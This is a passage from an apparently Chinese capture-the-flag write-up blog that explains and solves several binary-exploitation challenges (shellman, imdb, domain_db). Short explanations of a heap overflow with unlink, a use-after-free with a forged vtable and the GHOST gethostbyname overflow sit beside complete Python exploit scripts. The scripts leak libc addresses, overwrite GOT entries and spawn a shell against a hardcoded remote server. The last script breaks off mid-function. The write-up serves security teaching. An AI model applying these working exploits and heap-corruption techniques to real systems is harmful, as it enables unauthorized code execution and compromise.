     puts_addr = l32<span class="list">(<span class="keyword">io</span>.read<span class="list">(<span class="number">4</span>)</span>)</span>
     print hex<span class="list">(<span class="keyword">puts_addr</span>)</span>
     libc_base = puts_addr - <span class="number">0</span>x00065650
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;URL:&amp;apos;)</span>
     system_addr = libc_base + <span class="number">0</span>x00040190
     binsh_addr = libc_base + <span class="number">0</span>x00160A24
     payload = <span class="keyword">&amp;apos</span><span class="comment">;http://%\x32\x00&amp;apos;+&amp;apos;a&amp;apos;*0x94 + l32(system_addr) + l32(pop_ebp_ret) + l32(binsh_addr)</span>
     io.writeline<span class="list">(<span class="keyword">payload</span>)</span>
     io.interact<span class="list">()</span>
exp<span class="list">(<span class="keyword">target</span>)</span></span></span></span></span></span></span>
</code></pre><h4 id="shellman">shellman</h4><p>&#x5728;edit&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x5BF9;&#x957F;&#x5EA6;&#x505A;&#x5224;&#x65AD;&#xFF0C;&#x5B58;&#x5728;&#x5806;&#x6EA2;&#x51FA;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fda476.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;-1">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x53C2;&#x8003;&#x4E86;217&#x7684;0ctf freenote&#x7684;writeup&#x4E2D;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x901A;&#x8FC7;&#x5806;&#x6EA2;&#x51FA;&#xFF0C;&#x4FEE;&#x6539;&#x4E0B;&#x4E00;&#x5757;&#x5806;&#x7684;size&#x5B57;&#x8282;&#x4E2D;&#x7684;prev_inuse&#x6BD4;&#x7279;&#x4F4D;&#xFF0C;&#x8BA9;&#x4E0B;&#x4E00;&#x5757;&#x5806;&#x8BEF;&#x8BA4;&#x4E3A;&#x5176;&#x4E0A;&#x4E00;&#x5757;&#x5806;&#x5904;&#x4E8E;&#x7A7A;&#x95F2;&#x6001;&#x3002;</p>
<p>&#x4E4B;&#x540E;&#x5728;free &#x4E0B;&#x4E00;&#x5757;&#x5806;&#x65F6;&#xFF0C;&#x540E;&#x8C03;&#x7528;unlink&#x3002;&#x901A;&#x8FC7;&#x4F2A;&#x9020;&#x7684;&#x4E0A;&#x4E00;&#x5757;&#x5806;&#x7ED3;&#x6784;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;bss&#x8282;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x3002;</p>
<p>&#x4E4B;&#x540E;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x7684;edit&#x548C;show&#x529F;&#x80FD;&#xFF0C;&#x5B9E;&#x73B0;&#x5185;&#x5B58;&#x7684;&#x4EFB;&#x610F;&#x8BFB;&#x5199;&#x3002;</p>
<pre><code>&amp;#x5229<span class="comment">;&amp;#x7528;&amp;#x811A;&amp;#x672C;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;, 10002)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./shellman&amp;apos;</span>
def new_sc<span class="list">(<span class="keyword">io</span>, sc)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;2&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">len</span><span class="list">(<span class="keyword">sc</span>)</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.write<span class="list">(<span class="keyword">sc</span>)</span>
def edit_sc<span class="list">(<span class="keyword">io</span>, index, new_sc)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;3&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">index</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">len</span><span class="list">(<span class="keyword">new_sc</span>)</span>)</span>)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.write<span class="list">(<span class="keyword">new_sc</span>)</span>
def delete_sc<span class="list">(<span class="keyword">io</span>, index)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;:&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">index</span>)</span>)</span>
def list_sc<span class="list">(<span class="keyword">io</span>)</span>:
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;&amp;gt;&amp;apos;)</span>
    io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;1&amp;apos;)</span>
    io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;SHELLC0DE 0: &amp;apos;)</span>
    return l64<span class="list">(<span class="keyword">io</span>.read<span class="list">(<span class="number">16</span>)</span>.decode<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;hex&amp;apos;))</span>
def exp<span class="list">(<span class="keyword">target</span>)</span>:
    #io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">REPR</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(REPR, &amp;apos;green&amp;apos;))</span>
    io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*0xa0) #0x603010</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;b&amp;apos;*0xa0) #0x6030c0</span>
    new_sc<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;/bin/sh;&amp;apos;+&amp;apos;c&amp;apos;*0x98) #0x603170</span>
    ptr_addr = <span class="number">0</span>x00000000006016d0
    #                              rax                  rdx
    payload = l64<span class="list">(<span class="number">0</span>)</span> + l64<span class="list">(<span class="number">0</span>xa1)</span> + l64<span class="list">(<span class="keyword">ptr_addr-0x18</span>)</span> + l64<span class="list">(<span class="keyword">ptr_addr-0x10</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*0x80 + l64(0xa0) + l64(0xb0)</span>
    edit_sc<span class="list">(<span class="keyword">io</span>, <span class="number">0</span>, payload)</span> # change <span class="variable">*0x6016d0 = 0x6016b8
    delete_sc(io, 1)
    free_got = 0x0000000000601600
    payload2 = l64(0) + l64(1) +l64(0xa0) + l64(free_got)
    edit_sc(io, 0, payload2)
    free_addr = list_sc(io)
    print hex(free_addr)
    #local
    &amp;apos;&amp;apos;&amp;apos;
    system_addr = 0x00007FFFF7A5B640
    &amp;apos;&amp;apos;&amp;apos;
    libc_base = free_addr - 0x0000000000082DF0
    system_addr = libc_base + 0x0000000000046640
    edit_sc(io, 0, l64(system_addr))
    delete_sc(io, 2)
    io.interact()
exp(target)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
</code></pre><h4 id="imdb">imdb</h4><h4 id="&#x6F0F;&#x6D1E;&#x70B9;&#xFF1A;">&#x6F0F;&#x6D1E;&#x70B9;&#xFF1A;</h4><p>&#x5728;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5C06;&#x6240;&#x6709;&#x540C;&#x540D;&#x7684;&#x5168;&#x90E8;&#x5220;&#x9664;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x4F1A;&#x5C06;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x7684;&#x6307;&#x9488;&#x6E05;0&#xFF0C;&#x5B58;&#x5728;uaf&#x6F0F;&#x6D1E;&#x3002;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fda6e7.jpg" alt=""></p>
<p><img src="http://taojinke.github.io/img/20150607/2fda6e7.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;-2">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x56E0;&#x4E3A;movie&#x548C;tv&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x524D;4&#x5B57;&#x8282;&#x4E3A;&#x4E00;&#x4E2A;&#x865A;&#x8868;&#x6307;&#x9488;&#xFF0C;&#x6240;&#x4EE5;&#x8003;&#x8651;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x3002;&#x4E0D;&#x8FC7;&#x56E0;&#x4E3A;&#x7A0B;&#x5E8F;&#x4E2D;&#x6240;&#x6709;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x5806;&#x4E0A;&#xFF0C;&#x4F2A;&#x9020;&#x7684;&#x865A;&#x8868;&#x4E5F;&#x53EA;&#x80FD;&#x653E;&#x5728;&#x5806;&#x4E0A;&#xFF0C;&#x8981;&#x60F3;&#x83B7;&#x53D6;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;&#x6CC4;&#x9732;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x5F97;&#x5230;&#x4F2A;&#x9020;&#x865A;&#x8868;&#x6240;&#x5728;&#x5730;&#x5740;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x4E3A;&#x4E86;&#x62FF;shell&#x8FD8;&#x9700;&#x8981;&#x83B7;&#x53D6;libc&#x5E93;&#x52A0;&#x8F7D;&#x57FA;&#x5730;&#x5740;&#x3002;</p>
<p>&#x5229;&#x7528;&#x6253;&#x5370;movie&#x4E2D;&#x7684;actors&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x7684;&#x8BFB;&#x53D6;&#x3002;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fda958.jpg" alt=""></p>
<p>&#x8FD9;&#x9053;&#x9898;&#x6CA1;&#x6709;&#x7ED9;libc&#x5E93;&#xFF0C;&#x4E0D;&#x8FC7;&#x6839;&#x636E;&#x6CC4;&#x9732;&#x7684;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x7528;&#x7684;&#x5E93;&#x548C;shellman&#x662F;&#x540C;&#x4E00;&#x4E2A;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x6709;libc&#x5E93;&#x3002;</p>
<pre><code>&amp;#x5229<span class="comment">;&amp;#x7528;&amp;#x7684;&amp;#x811A;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;,10003)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./imdb&amp;apos;</span>
def add_tv<span class="list">(<span class="keyword">io</span>, name, session, rating, introduction)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;1&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">session</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">rating</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">introduction</span>)</span>
def add_movie<span class="list">(<span class="keyword">io</span>, name, actors, rating, introduction)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;2&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">actors</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">rating</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">introduction</span>)</span>
def remove_entry<span class="list">(<span class="keyword">io</span>, name)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;3&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
def show_all<span class="list">(<span class="keyword">io</span>)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;bbbbbbbb&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;actors: &amp;apos;)</span>
     d = io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;).strip(&amp;apos;\n&amp;apos;)</span>
     malloc_addr = l64<span class="list">(<span class="keyword">d</span>.ljust<span class="list">(<span class="number">8</span>, <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;))</span>
     print hex<span class="list">(<span class="keyword">malloc_addr</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;bbbbbbbb&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;actors: &amp;apos;)</span>
     d = io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;).strip(&amp;apos;\n&amp;apos;)</span>
     heap_addr = l64<span class="list">(<span class="keyword">d</span>.ljust<span class="list">(<span class="number">8</span>, <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;))</span>
     print hex<span class="list">(<span class="keyword">heap_addr</span>)</span>
     return malloc_addr, heap_addr
def exp<span class="list">(<span class="keyword">target</span>)</span>:
     io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602010</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6020f0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6021d0</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;)</span>
     malloc_got = <span class="number">0</span>x0000000000601C58
     db_addr = <span class="number">0</span>x601dc0
     movie_vt = <span class="number">0</span>x00000000004015b0
     payload = l64<span class="list">(<span class="keyword">movie_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*8 + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(malloc_got)</span>
     print len<span class="list">(<span class="keyword">payload</span>)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;ccc&amp;apos;, payload, 300, &amp;apos;eeee&amp;apos;) #0x602010 0x602110</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6021e0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6022c0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6023a0</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;)</span>
     payload = l64<span class="list">(<span class="keyword">movie_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*8 + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(db_addr)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;ccc&amp;apos;, payload, 300, &amp;apos;eeee&amp;apos;)</span>
     malloc_addr, heap_addr = show_all<span class="list">(<span class="keyword">io</span>)</span>
     io.gdb_hint<span class="list">()</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6023b0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602490</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602570</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;)</span>
     #local
     #addr2 = malloc_addr - <span class="number">0</span>x00007FFFF7277750 + <span class="number">0</span>x00007FFFF723B52C
     #remote
     addr2 = malloc_addr - <span class="number">0</span>x0000000000082750 + <span class="number">0</span>x000000000004652c
     fake_vt = <span class="number">0</span>x6023b0+8 - <span class="number">0</span>x602010 + heap_addr
     payload = l64<span class="list">(<span class="keyword">fake_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;/bin/sh;&amp;apos; + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(db_addr)</span>
     print len<span class="list">(<span class="keyword">payload</span>)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, l64<span class="list">(<span class="keyword">addr2</span>)</span>, payload, <span class="number">300</span>, <span class="keyword">&amp;apos</span><span class="comment">;eeee&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
     io.interact<span class="list">()</span>
exp<span class="list">(<span class="keyword">target</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
</code></pre><h4 id="domain_db">domain_db</h4><h4 id="&#x6F0F;&#x6D1E;&#xFF1A;">&#x6F0F;&#x6D1E;&#xFF1A;</h4><p>&#x8BE5;&#x7A0B;&#x5E8F;&#x8C03;&#x7528;&#x4E86;gethostbyname&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x7684;libc&#x7684;&#x7248;&#x672C;&#x4E3A;2.15.&#xFF08;&#x901A;&#x8FC7;strings libc.so.6 | grep GLIBC&#x67E5;&#x770B;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x786E;&#x5B9A;&#x662F;&#x53BB;&#x5E74;&#x7684;ghost&#x6F0F;&#x6D1E;&#x3002;</p>
<p>&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x6F0F;&#x6D1E;&#x521A;&#x51FA;&#x6765;&#x65F6;&#xFF0C;&#x5927;&#x6982;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x6F0F;&#x6D1E;&#xFF0C;&#x77E5;&#x9053;&#x6F0F;&#x6D1E;&#x4E3A;4&#x5B57;&#x8282;&#x6EA2;&#x51FA;&#x3002;&#x9700;&#x8981;&#x8FBE;&#x5230;&#x6EA2;&#x51FA;&#x9700;&#x8981;&#x6EE1;&#x8DB3;2&#x4E2A;&#x6761;&#x4EF6;&#xFF1A;</p>
<p>Gethostbyname&#x7684;name&#x53C2;&#x6570;&#x9700;&#x8981;&#x5927;&#x4E8E;0&#xD7;400&#xFF0C;&#x4E14;&#x5747;&#x4E3A;&#x6570;&#x5B57;&#x6216;&#x8005;.&#x53F7;&#x3002;</p>
<p>&#x901A;&#x8FC7;&#x5206;&#x6790;&#xFF0C;&#x53D1;&#x73B0;&#x8BE5;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x4E0B;&#x4E00;&#x4E2A;&#x5806;&#x7684;size&#x4F4D;&#x3002;</p>
<h4 id="&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;">&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</h4><p>1.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x7533;&#x8BF7;&#x4E86;0-10&#x4E2A;domain&#x3002;</p>
<p>2.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x91CA;&#x653E;domain1</p>
<p>3.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x8C03;&#x7528;gethostbyname&#xFF0C;&#x6B64;&#x65F6;&#x4FDD;&#x8BC1;gethostbyname&#x4E2D;&#x7533;&#x8BF7;&#x7684;&#x5806;&#x521A;&#x597D;&#x5B8C;&#x5168;&#x5360;&#x7528;domain1&#x91CA;&#x653E;&#x51FA;&#x6765;&#x7684;&#x5806;&#x3002;&#x8FD9;&#x6837;&#x521A;&#x597D;&#x80FD;&#x8986;&#x76D6;domain2&#x7684;size&#x4F4D;&#xFF0C;&#x8986;&#x76D6;&#x4E3A;0&#xD7;3231&#xFF0C;&#x5373;&#x5BF9;&#x5E94;ascii&#x4E2D;&#x7684;21&#x3002;</p>
<p>4.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x91CA;&#x653E;domain2&#x3002; &#x6B64;&#x65F6;domain2&#x7684;size&#x88AB;&#x4FEE;&#x6539;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x91CA;&#x653E;&#x65F6;&#x5806;&#x7BA1;&#x7406;&#x5668;&#x4F1A;&#x5C06;domain3-10&#x7684;&#x533A;&#x57DF;&#x4E5F;&#x56DE;&#x6536;&#x4E86;&#x3002;&#x6B64;&#x6B65;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x8FC7;free check&#xFF0C;&#x6211;&#x8BA9;domain2_ptr + fake_size == av-&gt;top&#x3002;</p>
<p>5.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x4E4B;&#x540E;&#x518D;&#x6B21;&#x7533;&#x8BF7;&#x7A7A;&#x95F4;&#x65F6;&#xFF0C;&#x4F1A;&#x5C06;domain3-10&#x7684;&#x7A7A;&#x95F4;&#x4F1A;&#x88AB;&#x518D;&#x6B21;&#x5206;&#x914D;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x67D0;&#x4E2A;domain&#x7684;name&#x6307;&#x9488;&#x4E3A;free_got&#x3002;</p>
<p>6.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x4E4B;&#x540E;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x7684;show&#x548C;edit&#x529F;&#x80FD;&#x5BF9;free_got&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x548C;&#x6539;&#x5199;&#x3002;</p>
<pre><code>&amp;<span class="comment">#x5229;&amp;#x7528;&amp;#x811A;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
<span class="keyword">from</span> zio <span class="keyword">import</span> *
target = (&amp;apos;<span class="number">119.254</span>.101.197&amp;apos;, <span class="number">10006</span>)
<span class="comment">#target = &amp;apos;./domain_db&amp;apos;</span>
<span class="function"><span class="keyword">def</span> <span class="title">add_domain</span><span class="params">(io, name)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">1</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(name)
<span class="function"><span class="keyword">def</span> <span class="title">lookup_domain</span><span class="params">(io, id)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">5</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
<span class="function"><span class="keyword">def</span> <span class="title">edit_domain_name</span><span class="params">(io, id, new_name)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">2</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(new_name)
<span class="function"><span class="keyword">def</span> <span class="title">remove_domain</span><span class="params">(io, id)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">3</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
<span class="function"><span class="keyword">def</span> <span class="title">list_domain</span><span class="params">(io)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">4</span>&amp;apos;)
    io.read_until(&amp;apos;&amp;lt;<span class="number">1</span>&amp;gt; &amp;apos;)
    free = l32(io.read(<span class="number">4</span>))
    <span class="keyword">print</span> hex(free)
    <span class="keyword">return</span> free
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span>
    io = zio(target, timeout=<span class="number">10000</span>, print_read=COLORED(RAW, &amp;apos;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))
    io.gdb_hint()
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos; * (<span class="number">0x800</span> - <span class="number">16</span> - <span class="number">8</span> - <span class="number">1</span> - <span class="number">4</span> - <span class="number">3</span>)+&amp;apos;<span class="number">12</span>&amp;apos;) <span class="comment">#0 0x804c008 0x804c7f0</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#1 0x804c878 0x804cff0  top=0x804d070</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x1a0</span>) <span class="comment">#2</span>
    add_domain(io, &amp;apos;/bin/sh&amp;apos;+&amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x88</span>) <span class="comment">#3 0x0804d340 0x0804d2a8</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x10</span>) <span class="comment">#4 0x0804d3e0</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x5b0</span>) <span class="comment">#5</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#6</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#7</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#8</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#9</span>
